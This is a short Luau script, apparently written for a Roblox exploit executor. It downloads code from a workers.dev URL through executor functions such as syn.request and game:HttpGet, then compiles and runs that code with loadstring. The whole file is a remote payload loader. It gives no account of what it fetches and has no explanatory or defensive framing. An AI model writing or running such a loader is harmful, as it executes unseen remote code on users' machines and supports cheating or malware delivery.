--!strict
local WORKER_URL: string = "https://portalg.okathub.workers.dev/"

local function fetchPayload(url: string): string?
    local ok, response = pcall(function()
        return game:HttpGet(url, true)
    end)

    if ok and type(response) == "string" and #response > 0 then
        return response
    end

    local httpRequest = request or http_request or (syn and syn.request) or (http and http.request)
    if httpRequest then
        local res = httpRequest({
            Url = url,
            Method = "GET"
        })
        if res and res.StatusCode == 200 and type(res.Body) == "string" then
            return res.Body
        elseif res then
            warn(string.format("Failed", res.StatusCode, tostring(res.Body)))
            return nil
        end
    end

    warn("Failed")
    return nil
end

local scriptSource = fetchPayload(WORKER_URL)
if scriptSource then
    local compiledFn, syntaxErr = loadstring(scriptSource)
    if compiledFn then
        task.spawn(compiledFn)
    else
        warn("Failed", syntaxErr)
    end
end
